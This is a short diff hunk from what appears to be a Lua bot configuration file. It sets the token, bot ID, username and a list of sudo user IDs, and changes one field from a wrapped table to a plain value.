@@ -61,7 +61,7 @@ token = token,
 bot_id = botid,
 username = username, 
 sudo_users = {SUDO,944353237,1605682553,1645553841},
-simbaelrayes = {link.result},
+simbaelrayes = link.result,
 }
 end end 
 
